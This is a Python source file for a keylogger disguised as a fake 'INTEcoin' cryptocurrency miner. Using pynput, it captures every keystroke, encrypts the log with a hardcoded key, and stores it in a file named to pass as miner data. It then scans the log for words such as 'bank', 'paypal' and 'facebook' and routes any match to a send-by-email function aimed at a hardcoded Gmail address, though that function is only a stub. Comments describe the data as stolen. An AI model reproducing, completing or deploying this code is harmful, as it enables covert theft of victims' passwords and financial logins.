import os.path
import time
import random

from multiprocessing import Process
from cryptography.fernet import Fernet
from os import path
from pynput.keyboard import Key, Listener

keys = []
keystrokes_count = 0
saves_count = 0
KEYSTROKES_BUFFER_SIZE = 20  # How many keystrokes before saving
SAVES_BUFFER_SIZE = 2  # How many saves before sending
LOGS_PATH = "Logs/"  # File path to save stolen data
TARGET_EMAIL = "intelogger@gmail.com" # Sender and receiver of the data


class Encryption():
    encryptKey = "bfSmGi_FREbBA4tiQhD23rxeArgAysjxpdCg2mMEjmk="  # Generated using Fernet.generate_key()

    @staticmethod
    def encrypt(text):
        """
        This function encrypts data and returns the encryption.
        :param text: The data to be encrypted.
        :return: The encrypted text.
        """
        return Fernet(Encryption.encryptKey).encrypt(text.encode())

    @staticmethod
    def decrypt(text):
        """
        This function decrypts data and returns it as plain text.
        :param text: The text to decrypt.
        :return: The decrypted text.
        """
        return Fernet(Encryption.encryptKey).decrypt(text).decode()

    @staticmethod
    def bytes_from_file(filename, chunksize=8192):
        with open(filename, "rb") as f:
            while True:
                chunk = f.read(chunksize)
                if chunk:
                    for b in chunk:
                        yield chr(b)
                else:
                    break


def press(key):
    """
    Activated by the listener every key press.
    Checks counters and sends the data to the logging function.
    :param key: The key pressed given from pynput module.
    """
    if str(key) == "Key.esc": # Checks for program exit
        return False
    global keys, keystrokes_count, saves_count
    keys.append(key)  # append every pressed key.
    keystrokes_count += 1  # keep track of how many keys.
    if keystrokes_count >= KEYSTROKES_BUFFER_SIZE:
        writer(keys)
        keystrokes_count = 0
        keys = []
        saves_count += 1
    if saves_count >= SAVES_BUFFER_SIZE:
        saves_count = 0
        results()


def writer(log):
    """
    Saves the log in a dat file.
    :param log: An array of pressed keys.
    """
    with open(LOGS_PATH + "INTEcoin.dat", "ab") as file:
        toWrite = ""
        for i, key in enumerate(log): # Removes repeated spaces and enters
            if i > 0:
                if str(key) == "Key.space" and str(log[i - 1]) == "Key.space":
                    continue
                if str(key) == "Key.enter" and str(log[i - 1]) == "Key.enter":
                    continue
            key = parse(key) # Converts the key to a readable character
            toWrite += key
        file.write(Encryption.encrypt(toWrite))
        file.write(b"@")  # Putting a separator for the encryption diod see Fernet using this as the cypher text
        file.close()


def parse(key):
    """
    Takes a string of a key pressed and makes it human readable.
    :param key: A string to parse into readable format.
    :return: The key as readable as possible.
    """
    key = str(key)
    if key == "'":  # Handling the ' sign
        return key
    key = key.replace("'", "")  # Delete ' ' from output
    if key == "Key.enter" or key == "Key.space":
        return "\n"
    if "Key" in key:
        return key + " " # If it has a "Key" parameter before add a space so it's more readable
    return key


def results():
    """
    Steal logic function.
    INTEcoin - Holds the encrypted data which deletes after the function finishes copying the file.
    """
    keywords = ["bank", "hmo", "facebook", "mail", "paypal"]
    toSend = False # File has one of the keywords flag
    chunk = ""
    DecryptedLog = ""

    for byt in Encryption.bytes_from_file(LOGS_PATH + "INTEcoin.dat"): # Read stolen data file as chunks and save them in a list
        if byt == "@":
            DecryptedLog += Encryption.decrypt(chunk.encode())
            chunk = ""
            continue
        chunk += byt
    
    print(DecryptedLog)

    for word in keywords: # Checking if any sensitive data was inputted
        if word in DecryptedLog:
            toSend = True
            break
    if toSend:
        send()  # Send the encrypted data
    os.remove(LOGS_PATH + "INTEcoin.dat") # Delete file to avoid sending the same data again


def send():
    """
    Sends the data via email.
    :param data: The data to send.
    :param email: The email used to send. The email is the sender and the receiver.
    """
    global TARGET_EMAIL
    # Elad
    # Send data to mail saved in parameter: TARGET_EMAIL
    # SMTP
    print("HAS A KEYWORD")


with Listener(on_press=press) as listener: # Keypress listener
    listener.join()


def miner(): # Fake miner
    print("Welcome to INTEminer for INTEcoins!")
    print("Mining", end = "")
    INTEcoins=0
    file_count = 1
    while True:
        # Miner messages
        print(".", end = "")
        randomNumber=random.randint(1, 100)
        time.sleep(randomNumber/20) # Sleep for a short random time
        if randomNumber%10 == 0:
            INTEcoins += randomNumber
            print("\nMined {} INTEcoins! You currently have {} coins!".format(randomNumber, INTEcoins))
            print("Mining", end = "")

        # Write fake logs
        if randomNumber%50 == 0:
            file_count+=1
        else:
            with open(LOGS_PATH + "INTEcoin{}.dat".format(file_count), "a") as file:
                file.write("{0:b}".format(random.randint(10000000000,100000000000)))
                file.close()


"""
if __name__ == '__main__':
    kl = Process(target = miner)
    kl.start()
"""
#miner()
